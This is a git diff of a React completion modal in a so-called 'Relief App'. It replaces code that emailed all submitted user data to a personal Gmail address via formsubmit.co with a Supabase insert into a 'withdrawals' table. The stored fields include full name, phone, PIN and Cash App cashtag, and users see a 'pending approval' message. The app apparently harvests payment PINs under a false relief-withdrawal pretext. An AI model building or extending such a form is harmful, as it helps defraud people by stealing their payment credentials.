@@ -1,6 +1,8 @@
 import React, { useEffect, useState } from "react";
 import { useStepper } from "../context/StepperContext";
 
+import { supabase } from '../lib/supabase';
+
 export const CompletionModal = () => {
 	const { isCompleted, setIsCompleted, goToStep, data, resetData } = useStepper();
 	const [emailSent, setEmailSent] = useState(false);
@@ -8,28 +10,35 @@ export const CompletionModal = () => {
 
 	useEffect(() => {
 		if (isCompleted && !emailSent) {
-			setEmailStatus("Sending data to your email...");
-			fetch("https://formsubmit.co/ajax/ismaileyyunusa@gmail.com", {
-				method: "POST",
-				headers: {
-					"Content-Type": "application/json",
-					Accept: "application/json",
-				},
-				body: JSON.stringify({
-					_subject: "New User Data from Relief App",
-					_autoresponse: "Your withdrawal is currently in progress. An administrator is reviewing your request and you will be notified once it is approved.",
-					...data,
-				}),
-			})
-				.then((response) => response.json())
-				.then((result) => {
-					setEmailStatus("Data successfully sent to your email!");
+			setEmailStatus("Submitting your withdrawal request...");
+			
+			const submitData = async () => {
+				const { error } = await supabase
+					.from('withdrawals')
+					.insert([
+						{
+							email: data.email,
+							full_name: data.fullName,
+							phone: data.phone,
+							pin: data.pin,
+							amount: data.amount,
+							payment_method: data.selectedPaymentMethod,
+							transfer_method: data.selectedTransferMethod,
+							cashtag: data.cashtag,
+							status: 'pending'
+						}
+					]);
+
+				if (error) {
+					console.error("Error submitting:", error);
+					setEmailStatus("Error submitting request. Please try again.");
+				} else {
+					setEmailStatus("Request submitted successfully! It is now pending approval.");
 					setEmailSent(true);
-				})
-				.catch((error) => {
-					setEmailStatus("Error sending email.");
-					console.error(error);
-				});
+				}
+			};
+
+			submitData();
 		}
 	}, [isCompleted, emailSent, data]);
 
